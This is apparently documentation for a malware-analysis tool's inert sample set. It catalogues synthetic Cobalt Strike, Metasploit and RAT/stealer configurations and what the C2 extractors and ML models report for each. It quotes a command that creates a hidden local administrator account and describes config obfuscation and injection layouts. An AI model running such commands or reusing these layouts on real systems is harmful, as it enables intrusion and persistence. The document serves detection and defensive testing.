The **`c2/`** folder of `samples.zip` has one sub-folder per implant family the tab
reads. They are inert: the beacon and the stager are a configuration block and
code *fragments* inside an `MZ` + text stub (nothing that can run), and the RATs
are binkit stubs whose only code is `ret`. Their configurations use the real
formats, so the extractors read them exactly as they would a real sample. Built
by `c2_samples()` in `scripts/make_samples.py`; the C2 values are the
campaign's (`cdn-update.example.net`, `203.0.113.47`).

| Sample | Family | How it is stored | What comes out |
| --- | --- | --- | --- |
| `c2/cobaltstrike/sample_cs_beacon.bin` | Cobalt Strike | TLV config XOR 0x2e (4.x), as in a memory dump | HTTPS beacon to `cdn-update.example.net:443`, GET/POST URIs, user agent, 45 s / 25 % sleep, pipe `\\.\pipe\factura_sync_%x`, spawn-to, watermark `20260187`; Host header `billing-portal.example` → **domain fronting** note; RSA key (inert modulus) for dissect.cobaltstrike |
| `c2/rmm/sample_rmm_screenconnect.msi` | RMM: ScreenConnect | trojanised-installer shape: an MSI whose CustomAction launches the ScreenConnect client (`Binary.ScreenConnect`, inert stub) with `?e=Access&y=Guest&h=relay.invoice-support.example&p=8041` | **RMM** configuration: product, vendor, relay `relay.invoice-support.example:8041`, session type *Access* — finding `c2:rmm` (medium: legitimate software bound to someone's instance); the relay lands in the IOCs with the badge *RMM: ScreenConnect*. **Also in a normal analysis**, without running C2: every IOC extraction passes the objects through the RMM extractor (same finding id, so running C2 later does not duplicate it) |
| `c2/rmm/sample_rmm_lolrmm_only.exe` | RMM: GetScreen | inert MZ stub with the client's file name and the code-signing signer LOLRMM records | not in the built-in list: named **only once the LOLRMM catalogue is downloaded** (C2 view → *RMM / remote-access list → Refresh now*; it is also fetched on install and weekly) — *indicators* (product only, no instance), with *LOLRMM: GetScreen (RMM)* on the card |
| `c2/rmm/sample_rmm_client32.ini` | RMM: NetSupport Manager | `client32.ini` as fake-update kits drop it | gateway `198.51.100.61:443`, secondary `update-cdn.invoice-support.example:443`, GSK |
| `c2/cobaltstrike/sample_cs_trial_beacon.bin` | Cobalt Strike | same HTTPS beacon, watermark `0` | **known watermark**: `0 — trial / no licence…` on the card, and it is not used to link cases (a shared licence is no fingerprint); 1768.py's *Version (guess)* is labelled as inferred, not read from the beacon. When dissect.cobaltstrike already reads the configuration, 1768.py runs once (no `-x` / `-e` retries). **Your own shared list** (C2 → *Shared watermarks and keys*): add `20260187 test kit` and search `sample_cs_beacon.bin` again — its watermark shows `— test kit (your list)` and stops linking cases; the same for its *Public key SHA-256* (copy it from the card). The rebuilt malleable profile has a **Download .profile** button |
| `c2/cobaltstrike/sample_cs_dns_beacon.bin` | Cobalt Strike | same, DNS beacon | C2 `ns1/ns2.billing-portal.example:53`; **DNS channel**: idle IP `198.51.100.9`, DNS sleep, subdomain prefixes `fct.` / `cdn.` / `api.` |
| `c2/cobaltstrike/sample_cs_smb_beacon.bin` | Cobalt Strike | same, SMB beacon | **peer-to-peer** beacon on `\\.\pipe\factura_sync_%x`: a complete configuration without an internet C2 |
| `c2/cobaltstrike/sample_cs_beacon.ps1` | Cobalt Strike | PowerShell payload template: base64 + gzip → `$var_code` base64 + XOR 35 | the PowerShell analysis decodes the XOR stage as **binary** (`decrypted_powershell-stage_*.bin`, recipe base64 → xor(0x23)); C2 finds the beacon in that child |
| `c2/cobaltstrike/sample_cs_stager.ps1` | Cobalt Strike | same template (no gzip) around HTTPS stager shapes | stager read from its shellcode: `cdn-update.example.net:443`, URI `/Fctadz` (checksum8 92 = x86 stage), HTTPS from the request flags |
| `c2/cobaltstrike/sample_cs_stager_array.vbs` | Cobalt Strike | VBA payload format: the stager as `Array(-4, -24, …)` with `_` continuations | the number array becomes a binary child (`decrypted_vbscript-number_array_*.bin`; the same for `\xfc\xe8…` C / Python strings, `0xfc,0xe8,…` C# / PowerShell lists, and arrays in Office macros); C2 reads the stager in it |
| `c2/cobaltstrike/sample_cs_artifact_kit.exe` | Cobalt Strike | **Artifact Kit** EXE layout: the stager XOR-ed with a 4-byte key in `.data` behind its header (`[0][length][key][pad]`), plus the kit's named-pipe format | stager to `cdn-update.example.net:443` `/Fctadz`; when the parsers find nothing in the PE, the own decoder finds the key that turns the bytes into a block_api prologue and reads the decoded stager (*Loader: payload XOR-ed with 4-byte key … (Artifact Kit layout)*). A real Artifact Kit sample gave only indicators before |
| `c2/metasploit/sample_msf_https_stager.bin` | Metasploit / Meterpreter | `block_api` prologue + reverse_https shapes | stager to `cdn-update.example.net:443`, URI `/inv/Fct2026_0187` |
| `c2/metasploit/sample_msf_exec_adduser.bin` | Metasploit payload (exec) | `windows/x64/exec` *shapes*: x64 block_api, WinExec's hash, then the command line (inert text between) | *Payload windows/exec (adds a local user)* with the command `net user facturas_sync … /add && net localgroup Administrators …`; no connect-back, the command is the indicator. A real msfvenom exe of this kind came out as a generic *stager with no target* before |
| `c2/remcos/sample_remcos.exe` | Remcos | RC4-encrypted `SETTINGS` RCDATA resource, Remcos 3.x / 4.x layout (27 fields, read by position) | C2 `cdn-update.example.net:2404` (TLS) and `203.0.113.47:2404`, campaign `Factura-2026`, mutex `Rmc-F4C7A1`, install `%AppData%\InvoiceSync\remcos.exe` (hidden), Run value `InvoiceSync`, keylogger to `logs.dat` (encrypted), screenshots every 5 min |
| `c2/remcos/sample_remcos_traces.exe` | Remcos (indicators) | MZ stub with Remcos / Breaking-Security / `Rmc-` / licence strings and no `SETTINGS` resource | indicators only, no C2 |
| `c2/asyncrat/sample_asyncrat.exe` | AsyncRAT | 0.5.8 shape: `Client.Settings` with one static field per setting, set by its `.cctor` (ldstr → stsfld); every value AES-256 + HMAC, PBKDF2 key | the settings **named by their field**: C2 `cdn-update.example.net` / `203.0.113.47` × ports 6606/7707/8808 (the `Delay` 3 is no longer read as a port), version 0.5.8, group, mutex `AsyncMutex_6SI8OkPnk`; **install path** `%AppData%\WinUpdate.exe` and **persistence** (scheduled task *WinUpdate* at logon as admin, else the HKCU Run value); the pinned **server certificate** (CN *AsyncRAT Server*, validity, SHA-1 — links clients of the same server across cases); **builder defaults** flagged (mutex, certificate CN), no attribution. *Per tool*: the own decoder and rat-king-parser |
| `c2/asyncrat/sample_asyncrat_pastebin.exe` | AsyncRAT | 0.5.7B shape, Hosts/Ports `null`, Pastebin set | **dead drop**: the C2 comes from `https://paste.invoice-support.example/raw/Fct0187` at run time (its host is the IOC); options in plain words: anti-analysis, **BDOS** (killing it blue-screens the machine), 10 s delay; no install |
| `c2/asyncrat/sample_asyncrat_traces.exe` | AsyncRAT | same shape, settings encrypted with an unpublished salt (a modified builder) | nothing decrypts → **indicators only** (Anti_Analysis class, AsyncClient assembly, Pastebin setting): no C2, said as such |
| `c2/quasar/sample_quasar.exe` | QuasarRAT | 1.4 shape: `Quasar.Client.Config.Settings` set by its `.cctor`, AES-256 + HMAC, plain ENCRYPTIONKEY | settings **named by their field**: C2 `cdn-update.example.net:4782`, `203.0.113.47:4782` (host and port split from HOSTS), version 1.4.1, tag, mutex; install `%AppData%\SubDir\Client.exe` (hidden), persistence by the startup name, keylogger with its log folder, reconnect delay; the pinned certificate; Quasar **builder defaults** flagged (tag *Office04*, *Client.exe*, *Quasar Client Startup*, the `QSR_MUTEX_` pattern, certificate CN) |
| `c2/njrat/sample_njrat.exe` | njRAT | plain .NET settings strings | `cdn-update.example.net:5552`, campaign `Factura_2026`, version `0.7d`, `Server.exe` in `TEMP`, splitter `\|'\|'\|` |
| `c2/njrat/sample_njrat_custom_split.exe` | njRAT | custom splitter `\|S2026\|`, none of the classic marker strings | recognised by its command names (`ll`, `inv`, `ret`, `Ex`, `PLG`, `osk`, `pl`) next to host and port: C2 `cdn-update.example.net:5552`, splitter, commands |
| `c2/other/sample_protected_koivm.exe` | (protected) | a .NET client as **KoiVM** leaves it: no settings in clear, only the virtualizer's own strings | **C2**: no configuration, and a *Protected* banner says why — *KoiVM: its code runs inside a virtual machine of the protector, so the configuration cannot be read statically*. Also in the Markdown export. Real AsyncRAT / RedLine (KoiVM) and XWorm (Themida) samples showed nothing before |
| `c2/xworm/sample_xworm.exe` | XWorm | .NET settings, AES-256-ECB with key from the mutex | `cdn-update.example.net` and `203.0.113.47` on port 7000, splitter `<Xwormmm>`, `USB.exe`, mutex `Kz3FvP9qLmX2bWsA` |
| `c2/xworm/sample_xworm_named.exe` | XWorm | XWorm 5.x settings class (`XClient.Settings`, `.cctor` ldstr → stsfld), AES-256-ECB with MD5(mutex) | C2 `invoice-sync.example.net:7000` and `203.0.113.47:7000`, group `Factura-2026`, install `%AppData%\InvoiceSync.exe` (task / Run / Startup), USB `USB.exe`, keylog `%Temp%\Log.tmp`, made-up Telegram token / chat (marked sensitive) |
| `c2/xworm/sample_xworm_traces.exe` | XWorm (indicators) | .NET stub with XWorm names and splitter, nothing encrypted | indicators only, no C2 |
| `c2/agenttesla/sample_agenttesla.exe` | AgentTesla-like stealer | exfiltration channel in clear + browser / mail credential paths | SMTP `mail.billing-portal.example:587`, accounts, Telegram-style bot token and chat id on `api.telegram-relay.example` |
| `c2/redline/sample_redline.exe` | RedLine Stealer | .NET strings: base64 → XOR key `Ombudsman` → base64 | `cdn-update.example.net:7712`, `203.0.113.47:7712`, build `Factura_2026` |
| `c2/redline/sample_redline_named.exe` | RedLine Stealer | `EntryPoint` settings class (IP / ID / Message / Key, `.cctor` ldstr → stsfld), base64 + XOR + base64 | panel `panel.invoice-sync.example:7712` and `203.0.113.47:7712`, build ID `Factura_2026`, fake error message, key `Pedestal` (looks like base64) |
| `c2/redline/sample_redline_traces.exe` | RedLine Stealer (indicators) | .NET stub with RedLine names and the WCF channel, nothing encrypted | indicators only, no C2 |
| `c2/snakekeylogger/sample_snake_keylogger.exe` | Snake Keylogger | .NET strings DES-ECB, key MD5(string) | SMTP `mail.billing-portal.example:587`, sender / recipient accounts |
| `c2/snakekeylogger/sample_snake_telegram.exe` | Snake Keylogger | DES-ECB strings, Telegram + FTP channel | made-up bot token and chat ID, `ftp://ftp.invoice-sync.example/logs/` with user / password (marked sensitive) |
| `c2/snakekeylogger/sample_snake_traces.exe` | Snake Keylogger (indicators) | .NET stub with the banner, DES / MD5 / SMTP types and a browser path, nothing encrypted | indicators only, no C2 |
| `c2/raccoon/sample_raccoon_v2.exe` | Raccoon Stealer v2 | strings base64 + RC4 with a plain key | C2 `http://203.0.113.47/` and `https://cdn-update.example.net/`, key `edinayarossiya2026`, request fields, user agent, config ID `5c1d9a7e…7e25`, browser-DLL traces |
| `c2/raccoon/sample_raccoon_traces.exe` | Raccoon Stealer v2 (indicators) | native stub with the request fields and browser DLL / wallet names in clear | indicators only, no C2 |
| `c2/warzone/sample_warzone.exe` | Warzone / AveMaria | `.bss` = key length + RC4 key + RC4(config), version string, UAC-bypass moniker and `_rptls` key | C2 `cdn-update.example.net:5200`, version 1.60, raw options `010001` |
| `c2/warzone/sample_warzone_traces.exe` | Warzone / AveMaria (indicators) | native stub with the Warzone strings and no `.bss` | indicators only, no C2 |
| `c2/sliver/sample_go_sliver_like` | Sliver (Go) | pclntab names the Sliver implant packages (`sliverpb`, `transports/mtls`) — names only, nothing of Sliver runs | none held: *indicators* (framework, Go version, module); C2 works with or without the Go module |
| `c2/darkgate/sample_darkgate.bin` | DarkGate | base64 with a custom alphabet (MZ + text stub) | `http://cdn-update.example.net:2351`, `http://203.0.113.47:2351` (medium) |

**Cobalt Strike, in depth.** Every configuration says whether it is complete
(*configuration*), *partial*, or only *indicators* — traces such as the artifact
kit pipe format `MSSE-%d-server`, `msagent_%x` / `postex_%04x`, `beacon.x64.dll`
or the PowerShell template (`$var_code`, `-bxor 35`), reported with low
confidence, without C2, and dropped when the same case has the real
configuration. Besides the C2, the card shows the beacon's **DNS channel**,
**process injection** (execute methods, allocator, permissions, transforms),
**evasion** (sleep mask, syscalls, Beacon Gate, proxy, kill date),
**guardrails** (the user / computer / domain it is keyed to, with the value
dissect.cobaltstrike recovers — who it was built for), **peer-to-peer** beacons,
the team server's **RSA public key**, domain fronting (Host header ≠ C2 host),
IDN hosts in punycode, and per tool (1768.py / dissect) the raw view and the
rebuilt malleable profile.

**Extractor contract.** Every registered extractor (Cobalt Strike, Remcos,
AsyncRAT / DcRAT / Quasar, Metasploit, the .NET RATs and stealers) runs on every
object and reports *extracted*, *partial*, *indicators*, *not found*, *not
applicable*, *unsupported* or *error* — the **Extractors** sub-tab lists them
with their version, formats and fields, and the counts of the run. Each run has
an id; what every tool printed for every object (1768.py's JSON and text
reports, dissect.cobaltstrike's output, the built-in readers' results) is
stored as **RAW** under `results/c2_runs/<run>/` and never overwritten (the card
links it). Each configuration also has **normalized fields**: value, type,
status (*extracted* / *decrypted* / *inferred* / *conflicting* when the two
Cobalt Strike tools disagree), which tool read it, confidence, run and RAW
reference. **Re-interpret the RAW** re-reads a run with the current parsers
without running anything again (earlier interpretations kept). Configurations
that share an **RSA public key** (same team server), a **C2 host** or a
**watermark** with another case are linked under *Seen in other cases*. A
beacon DLL embedded in a loader / dropper / dump (reflective `MZARUH` / `MZRE`
head, sRDI) is carved and read when the whole file gives nothing.
| `c2/nanocore/sample_nanocore.exe` | NanoCore | type names (identification only) | family identified; settings encrypted in a resource, not decrypted (a medium finding) |

Analyse any of them (or the whole `c2/` folder, or one family's sub-folder, zipped) and open **C2 / Beacons**:
each configuration is already a finding, its C2 values are in **IOCs** (ready to
Check), and once you mark it, it appears in the report's *C2 / implant
configurations* section and in **Export CSV**.

## Machine Learning tab (EMBER2024)

The ML samples (in their type folders of `samples.zip`: `windows-pe/`, `dotnet/`, `linux-elf/`, `android/`, `pdf/`) are at least **three per EMBER2024
model**: for each type, "malicious-looking" ones from the invoice story plus a
**clean control**. All of them are inert: the only code is a `ret` (or an IL
`ret`), the payloads are random bytes, and the indicators are `*.example` /
RFC 5737. They are built by `ml_samples()` in `scripts/make_samples.py` with the
small builders in `scripts/binkit.py` (PE32/PE32+ with imports, exports, Rich
header, debug directory, version resource, .NET metadata; ELF64; APK).

| Sample | Model | Score | Result | What it carries |
| --- | --- | --- | --- | --- |
| `windows-pe/sample_win32_downloader.exe` | Win32 | 0.999 | above | `URLDownloadToFileA` / WinINet / `WinExec`, Run key, double-extension name, high-entropy `.data` |
| `windows-pe/sample_win32_injector.exe` | Win32 | 1.000 | above | `OpenProcess` → `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread`, `SeDebugPrivilege`, W+X sections |
| `windows-pe/sample_win32_invoice_calc.dll` | Win32 | 0.155 | below (control) | GUI/CRT imports, version resource, manifest, Rich header, PDB path, relocations, correct checksum |
| `windows-pe/sample_win64_keylogger.exe` | Win64 | 0.996 | above | `SetWindowsHookExW`, `GetAsyncKeyState`, clipboard, WinINet POST, Run key |
| `windows-pe/sample_win64_packed_loader.exe` | Win64 | 1.000 | above | `UPX0`/`UPX1` sections, W+X, high entropy, only `LoadLibrary`/`GetProcAddress`/`VirtualProtect` |
| `windows-pe/sample_win64_invoice_sync.dll` | Win64 | 0.013 | below (control) | ordinary DLL: exports, CRT/registry imports, version, Rich, PDB, relocations |
| `dotnet/sample_dotnet_stealer_ml.exe` | .NET | 0.998 | above | metadata/user strings: browser `Login Data`, `ProtectedData.Unprotect`, Telegram-style upload, Run key |
| `dotnet/sample_dotnet_loader_ml.exe` | .NET | 1.000 | above | `Assembly.Load` / `FromBase64String` / AES / GZip and a 24 KB encrypted managed resource |
| `dotnet/sample_dotnet_invoice_tool.dll` | .NET | 0.038 | below (control) | WinForms invoice calculator class library, version resource |
| `pdf/sample_pdf_openaction_js.pdf` | PDF | 0.998 | above | obfuscated JavaScript in `/OpenAction` |
| `pdf/sample_pdf_launch_embedded.pdf` | PDF | 0.983 | above | `/Launch cmd.exe` + an embedded `factura.exe` (MZ stub, scored too as a nested row) |
| `pdf/sample_pdf_invoice_clean.pdf` | PDF | 0.002 | below (control) | plain one-page invoice |
| `linux-elf/sample_elf_miner` | ELF | 0.998 | above | `stratum+tcp://` pool, xmrig-style options, cron persistence, high-entropy `.data` |
| `linux-elf/sample_elf_backdoor` | ELF | 1.000 | above | reverse shell to `203.0.113.47:4444`, `authorized_keys`, `chattr +i`, encrypted config blob |
| `linux-elf/sample_elf_invoice_sync` | ELF | 0.000 | below (control) | CLI tool strings, `libsqlite3` |
| `android/sample_apk_overlay_banker.apk` | APK | 0.930 | above | accessibility + overlay + SMS permissions, `DexClassLoader`, root checks, stored encrypted `assets/payload.dat` |
| `android/sample_apk_invoice_scanner.apk` | APK | 0.036 | below (control) | camera + internet only |
| `android/sample_invoice_viewer.apk` | APK | 0.004 | below | SMS permissions, but a tiny stub: shows that the score is **not** a verdict |

Notes:

- **Tiny synthetic files are not real programs**, so these scores show what the
  models react to rather than how they perform on real software. Two examples:
  - Small `.exe` stubs with no compiler traces score high even when clean.
    The clean controls are therefore DLLs with the usual MSVC traces.
  - The APK model on a 20 KB stub moves a lot with the random payload bytes
    (0.15–0.93 across seeds).
- In practice, open the sample in the tab, look at **Why** (feature blocks and
  top features), and mark the result yourself.
- **Report and CSV:** analyse those samples (or a ZIP of them), mark a result (e.g. the
  keylogger as *True positive*), then open **Reports** — the *Machine Learning*
  section lists every object with its score, verdict, hints and mark — or press
  **Export CSV** in the Machine Learning tab (one row per object).

Every other binary / PDF of the sample set is scored too. For example:

| Sample | Model | Score | Result |
| --- | --- | --- | --- |
| `windows-pe/sample_packed.exe` | Win64 | 0.990 | above threshold (packer sections, W+X, no imports) |
| `pdf/sample.pdf` | PDF | 0.999 | above threshold (JavaScript in the PDF) |
| `windows-pe/sample_lief_helper.dll` | Win64 | 0.044 | below threshold |
| `windows-pe/sample_bloated_invoice.exe` | Win64 | 0.167 | below threshold (the padding is not malicious by itself; its debloated child is scored too) |
| `windows-pe/sample_pyinstaller.exe` | Win32 | 0.270 | below threshold |

Inside archives (`sample_dropper_bundle.zip`, the ISO, the CAB…) each embedded
binary/PDF gets its own row. Results are **not findings until marked**.


**Extras on every scored object:**
- **Similar objects in your other cases** — the trees of the model route both files
  to the same leaves (share of trees). Analyse `make_samples.dotnet_stealer_exe()`
  in one case and `make_samples.dotnet_bitmap_loader_exe(make_samples.dotnet_stealer_exe())`
  in another: the hidden stage shows *100 % like … (case …) · same file*; the
  `.NET` loader sample shows its siblings (same builder, other literals) as close
  but not the same file. The index lives in `<cases>/.ml_index/`.
- **Unusual for the model** — when ≥ 5 % of the 200 features the model relies on
  most are unlike both malware and goodware of EMBER2024 (absent where > 97 % have
  them, present where < 1 % do, beyond both 99th percentiles), the score is flagged
  as less reliable. Real PEs measured 0–1 %; the inert `.NET` stubs of the samples ~7 %
  (they are flagged — as they should be).
- **Highest score of the case** at the top of the tab, and whether it comes from a
  stage (the loader often looks innocent; the hidden stage does not).

## Validating with real samples (`scripts/validate_samples.py`)

`python scripts/validate_samples.py <folder | file.zip> --expected expected.csv --out validation`
runs the full static pipeline (plus C2) over every sample — zips with the
`infected` password are opened in memory — and writes `validation.md / .csv /
.json`: one row per sample with the C2 configuration found, the engines'
agreement, each extractor's status, Go / .NET identification, findings, IOCs and
time. `expected.csv` (`name_or_sha256,family`) marks each row OK / MISS / OTHER
and totals them per family. Try it on the inert samples above; the real ones are
for the validation phase. Nothing in a sample is ever run.
